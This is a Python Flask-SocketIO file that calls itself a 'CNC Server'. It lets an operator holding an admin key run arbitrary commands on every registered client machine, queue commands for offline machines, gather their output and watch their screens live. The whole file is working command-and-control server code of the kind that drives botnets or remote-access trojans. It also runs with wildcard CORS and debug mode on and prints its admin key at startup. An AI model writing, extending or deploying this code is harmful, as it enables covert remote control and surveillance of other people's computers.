from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from flask_socketio import SocketIO, emit
import json
import os
from datetime import datetime
import uuid
import threading
import requests

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize SocketIO with eventlet
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Thread lock for file operations
file_lock = threading.Lock()

# Load configuration
def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

config = load_config()

# Load and save clients data
def load_clients():
    with file_lock:
        with open('clients.json', 'r') as f:
            return json.load(f)

def save_clients(data):
    with file_lock:
        with open('clients.json', 'w') as f:
            json.dump(data, f, indent=2)

# Store client SID mappings
client_sids = {}  # {client_id: sid}

# Authentication decorator
def login_required(f):
    def decorated_function(*args, **kwargs):
        if 'authenticated' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Routes
@app.route('/')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        admin_key = request.form.get('admin_key')
        if admin_key == config['admin_key']:
            session['authenticated'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='Invalid admin key')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/api/clients')
@login_required
def get_clients():
    data = load_clients()
    return jsonify(data['clients'])

@app.route('/api/history')
@login_required
def get_history():
    data = load_clients()
    return jsonify(data['command_history'])

# SocketIO Events - Client Events
@socketio.on('client_register')
def handle_client_register(data):
    client_id = data.get('client_id')
    hostname = data.get('hostname')
    ip = data.get('ip')
    os_info = data.get('os')
    
    print(f"[INFO] Client registered: {client_id} ({hostname})")
    
    # Store client SID mapping
    client_sids[client_id] = request.sid
    
    # Load clients data
    clients_data = load_clients()
    
    # Update or create client entry
    if client_id not in clients_data['clients']:
        clients_data['clients'][client_id] = {
            'hostname': hostname,
            'ip': ip,
            'os': os_info,
            'last_seen': datetime.utcnow().isoformat() + 'Z',
            'online': True,
            'queued_commands': []
        }
    else:
        clients_data['clients'][client_id]['hostname'] = hostname
        clients_data['clients'][client_id]['ip'] = ip
        clients_data['clients'][client_id]['os'] = os_info
        clients_data['clients'][client_id]['last_seen'] = datetime.utcnow().isoformat() + 'Z'
        clients_data['clients'][client_id]['online'] = True
    
    # Check for queued commands
    queued_commands = clients_data['clients'][client_id]['queued_commands']
    
    # Save updated data
    save_clients(clients_data)
    
    # Broadcast updated client list to admin
    emit('client_update', clients_data['clients'], broadcast=True, namespace='/')
    
    # Send queued commands to client
    if queued_commands:
        print(f"[INFO] Sending {len(queued_commands)} queued commands to {client_id}")
        for cmd in queued_commands:
            emit('execute_command', {
                'command_id': cmd['id'],
                'command': cmd['command']
            }, room=request.sid)
        
        # Clear queued commands
        clients_data['clients'][client_id]['queued_commands'] = []
        save_clients(clients_data)

@socketio.on('command_response')
def handle_command_response(data):
    command_id = data.get('command_id')
    client_id = data.get('client_id')
    success = data.get('success')
    output = data.get('output')
    
    print(f"[INFO] Command response from {client_id}: {command_id} - Success: {success}")
    
    # Load clients data
    clients_data = load_clients()
    
    # Add to command history
    history_entry = {
        'id': command_id,
        'client_id': client_id,
        'timestamp': datetime.utcnow().isoformat() + 'Z',
        'success': success,
        'output': output,
        'status': 'success' if success else 'failed'
    }
    
    clients_data['command_history'].append(history_entry)
    
    # Save updated data
    save_clients(clients_data)
    
    # Broadcast response to admin dashboard
    emit('command_response', history_entry, broadcast=True, namespace='/')

@socketio.on('disconnect')
def handle_disconnect():
    # Find client by SID
    client_id = None
    for cid, sid in client_sids.items():
        if sid == request.sid:
            client_id = cid
            break
    
    if client_id:
        print(f"[INFO] Client disconnected: {client_id}")
        
        # Update client status
        clients_data = load_clients()
        if client_id in clients_data['clients']:
            clients_data['clients'][client_id]['online'] = False
            clients_data['clients'][client_id]['last_seen'] = datetime.utcnow().isoformat() + 'Z'
            save_clients(clients_data)
            
            # Broadcast updated client list
            emit('client_update', clients_data['clients'], broadcast=True, namespace='/')
        
        # Remove from SID mapping
        del client_sids[client_id]

@socketio.on('ping')
def handle_ping(data):
    client_id = data.get('client_id')
    
    if client_id:
        # Update last_seen timestamp
        clients_data = load_clients()
        if client_id in clients_data['clients']:
            clients_data['clients'][client_id]['last_seen'] = datetime.utcnow().isoformat() + 'Z'
            clients_data['clients'][client_id]['online'] = True
            save_clients(clients_data)
        
        # Send pong response
        emit('pong', {'timestamp': datetime.utcnow().isoformat() + 'Z'})

@socketio.on('screen_frame')
def handle_screen_frame(data):
    client_id = data.get('client_id')
    image = data.get('image')
    timestamp = data.get('timestamp')
    
    print(f"[DEBUG] Received screen frame from {client_id}, image size: {len(image) if image else 0} bytes")
    
    # Broadcast screen frame to admin dashboard
    emit('screen_frame', {
        'client_id': client_id,
        'image': image,
        'timestamp': timestamp
    }, broadcast=True, namespace='/')
    
    print(f"[DEBUG] Broadcasted screen frame to dashboard")

# SocketIO Events - Admin Events
@socketio.on('toggle_screen_stream')
def handle_toggle_screen_stream(data):
    client_id = data.get('client_id')
    enabled = data.get('enabled')
    
    print(f"[INFO] Admin toggling screen stream for {client_id}: {enabled}")
    print(f"[DEBUG] Client SID: {client_sids.get(client_id, 'NOT FOUND')}")
    
    # Send toggle command to client
    if client_id in client_sids:
        emit('toggle_screen_stream', {
            'enabled': enabled
        }, room=client_sids[client_id])
        print(f"[DEBUG] Sent toggle command to client {client_id}")
    else:
        print(f"[WARN] Client {client_id} not connected")
        print(f"[DEBUG] Available clients: {list(client_sids.keys())}")

# SocketIO Events - Admin Events
@socketio.on('send_command')
def handle_send_command(data):
    target = data.get('target')  # 'all' or specific client_id
    command = data.get('command')
    command_id = str(uuid.uuid4())
    
    print(f"[INFO] Admin sending command: {command} to {target}")
    
    clients_data = load_clients()
    
    # Determine target clients
    if target == 'all':
        target_clients = list(clients_data['clients'].keys())
    else:
        target_clients = [target]
    
    # Send command to each target
    for client_id in target_clients:
        if client_id not in clients_data['clients']:
            continue
        
        client = clients_data['clients'][client_id]
        
        if client['online'] and client_id in client_sids:
            # Send command immediately
            emit('execute_command', {
                'command_id': command_id,
                'command': command
            }, room=client_sids[client_id])
            
            # Add to history with pending status
            history_entry = {
                'id': command_id,
                'client_id': client_id,
                'command': command,
                'timestamp': datetime.utcnow().isoformat() + 'Z',
                'status': 'pending',
                'output': ''
            }
            clients_data['command_history'].append(history_entry)
            
            # Broadcast to admin
            emit('command_response', history_entry, broadcast=True, namespace='/')
        else:
            # Queue command for offline client
            queued_cmd = {
                'id': command_id,
                'command': command,
                'queued_at': datetime.utcnow().isoformat() + 'Z'
            }
            clients_data['clients'][client_id]['queued_commands'].append(queued_cmd)
            
            # Add to history with queued status
            history_entry = {
                'id': command_id,
                'client_id': client_id,
                'command': command,
                'timestamp': datetime.utcnow().isoformat() + 'Z',
                'status': 'queued',
                'output': 'Client offline - command queued'
            }
            clients_data['command_history'].append(history_entry)
            
            # Broadcast to admin
            emit('command_response', history_entry, broadcast=True, namespace='/')
    
    # Save updated data
    save_clients(clients_data)

@socketio.on('get_clients')
def handle_get_clients():
    clients_data = load_clients()
    emit('client_update', clients_data['clients'])

print(f"[INFO] Starting CNC Server on {config['server_host']}:{config['server_port']}")
r = requests.get("https://api.ipify.org")

print(r.text)

print(f"[INFO] Admin key: {config['admin_key']}")
socketio.run(app, host=config['server_host'], port=config['server_port'], debug=True)
